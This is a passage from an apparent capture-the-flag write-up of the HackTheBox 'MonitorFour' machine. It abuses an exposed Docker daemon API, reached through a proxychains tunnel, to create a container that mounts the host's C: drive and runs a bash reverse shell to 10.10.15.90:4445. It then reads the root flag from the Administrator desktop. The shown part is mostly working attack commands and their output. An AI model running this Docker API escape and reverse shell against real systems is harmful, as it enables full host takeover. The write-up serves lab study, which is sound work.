hours","HostConfig":{"NetworkMode":"docker_setup_default"},"NetworkSettings":{"Networks":{"docker_setup_default":{"IPAMConfig":null,"Links":null,"Aliases":null,"MacAddress":"92:52:87:2f:87:9d","DriverOpts":null,"GwPriority":0,"NetworkID":"dbe8d772bacc3571da48a759376f0d8afddbe5453e8ee10b3cffd993ef5e3dec","EndpointID":"a26276da552de1b24f121014fc6ce39939f933daf4c546d27d5b9fe4e7c6ee0c","Gateway":"172.18.0.1","IPAddress":"172.18.0.3","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"DNSNames":null}}},"Mounts":[]},{"Id":"c2bdd5d10cc52dc02e046bbedec91178cc2e6a12403e3323b7b120f7eb77c2b2","Names":["/mariadb"],"Image":"docker_setup-mariadb","ImageID":"sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40","ImageManifestDescriptor":{"mediaType":"application/vnd.oci.image.manifest.v1+json","digest":"sha256:ceab562c32247d164213f4df42a241a695ed1b2ae5a971f45791a3275635deee","size":2568,"platform":{"architecture":"amd64","os":"linux"}},"Command":"docker-entrypoint.sh mariadbd","Created":1762794283,"Ports":[{"IP":"0.0.0.0","PrivatePort":3306,"PublicPort":3306,"Type":"tcp"}],"Labels":{"com.docker.compose.config-hash":"ae62dae65eee61960eb7c7a1b1b2cf918aaa7a689721404b85b492772d396eb0","com.docker.compose.container-number":"1","com.docker.compose.depends_on":"","com.docker.compose.image":"sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker_setup","com.docker.compose.project.config_files":"C:\\Users\\Administrator\\Documents\\docker_setup\\docker-compose.yml","com.docker.compose.project.working_dir":"C:\\Users\\Administrator\\Documents\\docker_setup","com.docker.compose.service":"mariadb","com.docker.compose.version":"2.39.1","desktop.docker.io/ports.scheme":"v2","desktop.docker.io/ports/3306/tcp":":3306","org.opencontainers.image.authors":"MariaDB Community","org.opencontainers.image.base.name":"docker.io/library/ubuntu:noble","org.opencontainers.image.description":"MariaDB Database for relational SQL","org.opencontainers.image.documentation":"https://hub.docker.com/_/mariadb/","org.opencontainers.image.licenses":"GPL-2.0","org.opencontainers.image.ref.name":"ubuntu","org.opencontainers.image.source":"https://github.com/MariaDB/mariadb-docker","org.opencontainers.image.title":"MariaDB Database","org.opencontainers.image.url":"https://github.com/MariaDB/mariadb-docker","org.opencontainers.image.vendor":"MariaDB Community","org.opencontainers.image.version":"11.4.8"},"State":"running","Status":"Up 11 hours (healthy)","HostConfig":{"NetworkMode":"docker_setup_default"},"NetworkSettings":{"Networks":{"docker_setup_default":{"IPAMConfig":null,"Links":null,"Aliases":null,"MacAddress":"c2:65:51:5e:54:07","DriverOpts":null,"GwPriority":0,"NetworkID":"dbe8d772bacc3571da48a759376f0d8afddbe5453e8ee10b3cffd993ef5e3dec","EndpointID":"bc372fe3210d697e55d4af53586c52742389899a89d99603e838ff2b812d36e7","Gateway":"172.18.0.1","IPAddress":"172.18.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"DNSNames":null}}},"Mounts":[{"Type":"volume","Name":"c037b802652b90f77688864756d7923900aaa2326ed97fe86213de892350e26c","Source":"","Destination":"/var/lib/mysql","Driver":"local","Mode":"","RW":true,"Propagation":""}]}]
```

```bash                                                                                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/tools/chisel]
└─# proxychains curl http://192.168.65.7:2375/images/json    
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:2375  ...  OK
[{"Containers":12,"Created":1762794130,"Id":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","Labels":{"com.docker.compose.project":"docker_setup","com.docker.compose.service":"nginx-php","com.docker.compose.version":"2.39.1"},"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","size":856},"RepoDigests":["docker_setup-nginx-php@sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666"],"RepoTags":["docker_setup-nginx-php:latest"],"SharedSize":-1,"Size":1277167255},{"Containers":1,"Created":1762791053,"Id":"sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40","Labels":{"com.docker.compose.project":"docker_setup","com.docker.compose.service":"mariadb","com.docker.compose.version":"2.39.1","org.opencontainers.image.authors":"MariaDB Community","org.opencontainers.image.base.name":"docker.io/library/ubuntu:noble","org.opencontainers.image.description":"MariaDB Database for relational SQL","org.opencontainers.image.documentation":"https://hub.docker.com/_/mariadb/","org.opencontainers.image.licenses":"GPL-2.0","org.opencontainers.image.ref.name":"ubuntu","org.opencontainers.image.source":"https://github.com/MariaDB/mariadb-docker","org.opencontainers.image.title":"MariaDB Database","org.opencontainers.image.url":"https://github.com/MariaDB/mariadb-docker","org.opencontainers.image.vendor":"MariaDB Community","org.opencontainers.image.version":"11.4.8"},"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40","size":856},"RepoDigests":["docker_setup-mariadb@sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40"],"RepoTags":["docker_setup-mariadb:latest"],"SharedSize":-1,"Size":454269972},{"Containers":0,"Created":1759921496,"Id":"sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412","Labels":null,"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412","size":9218},"RepoDigests":["alpine@sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412"],"RepoTags":["alpine:latest"],"SharedSize":-1,"Size":12794775}]
```

```bash                                                                                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/tools/chisel]
└─# proxychains curl -H 'Content-Type: application/json' \
-d '{
  "Image": "docker_setup-nginx-php:latest",
  "Cmd": ["/bin/bash","-c","bash -i >& /dev/tcp/10.10.15.90/4445 0>&1"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/host_root"]
  }
}' \
http://192.168.65.7:2375/containers/create -o response.json
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:2375  ...  OK
100   270    0    88  100   182     69    143  0:00:01  0:00:01 --:--:--   212
```

```bash
┌──(root💀kali)-[/home/kali/tools/chisel]
└─# cid=$(grep -o '"Id":"[^"]*"' response.json | cut -d'"' -f4) && \
cmdand> proxychains curl -X POST http://192.168.65.7:2375/containers/$cid/start
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:2375  ...  OK
```

* Penelope:

```bash
┌──(root💀kali)-[/home/kali/HTB/MonitorFour/CVE-2025-24367-Cacti-PoC]
└─# penelope -p 4445           
[+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.1.5 • 192.168.45.164 • 172.17.0.1 • 10.10.15.90
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from 70f9740f81d8~10.10.11.98-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[!] Python agent cannot be deployed. I need to maintain at least one Raw session to handle the PTY
[+] Attempting to spawn a reverse shell on 10.10.15.90:4445
[+] Got reverse shell from 70f9740f81d8~10.10.11.98-Linux-x86_64 😍 Assigned SessionID <2>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Shell upgraded successfully using /usr/bin/script! 💪
[+] Interacting with session [2], Shell Type: PTY, Menu key: F12 
[+] Logging to /root/.penelope/sessions/70f9740f81d8~10.10.11.98-Linux-x86_64/2025_12_14-02_36_32-932.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@70f9740f81d8:/var/www/html# cd /
root@70f9740f81d8:/# ls -la
total 60
drwxr-xr-x   1 root root 4096 Dec 14 05:36 .
drwxr-xr-x   1 root root 4096 Dec 14 05:36 ..
-rwxr-xr-x   1 root root    0 Dec 14 05:35 .dockerenv
lrwxrwxrwx   1 root root    7 Aug 24 16:20 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Aug 24 16:20 boot
drwxr-xr-x   5 root root  340 Dec 14 05:36 dev
drwxr-xr-x   1 root root 4096 Dec 14 05:35 etc
drwxr-xr-x   1 root root 4096 Nov 10 16:15 home
drwxrwxrwx   1 root root 4096 Dec  2 12:02 host_root
lrwxrwxrwx   1 root root    7 Aug 24 16:20 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Aug 24 16:20 lib64 -> usr/lib64                                                                                                                                                                               
drwxr-xr-x   2 root root 4096 Nov  3 20:44 media                                                                                                                                                                                            
drwxr-xr-x   2 root root 4096 Nov  3 20:44 mnt                                                                                                                                                                                              
drwxr-xr-x   2 root root 4096 Nov  3 20:44 opt
dr-xr-xr-x 208 root root    0 Dec 14 05:36 proc
drwx------   1 root root 4096 Dec 14 05:36 root
drwxr-xr-x   3 root root 4096 Nov  3 20:44 run
lrwxrwxrwx   1 root root    8 Aug 24 16:20 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Nov  3 20:44 srv
-rwxr-xr-x   1 root root  113 Sep 13 06:13 start.sh
dr-xr-xr-x  13 root root    0 Dec 13 19:08 sys
drwxrwxrwt   2 root root 4096 Nov  3 20:44 tmp
drwxr-xr-x   1 root root 4096 Nov  3 20:44 usr
drwxr-xr-x   1 root root 4096 Nov  4 04:06 var
root@70f9740f81d8:/# cat /host_root/Users/Administrator/Desktop/root.txt
e6f7***********************************d5dd
```
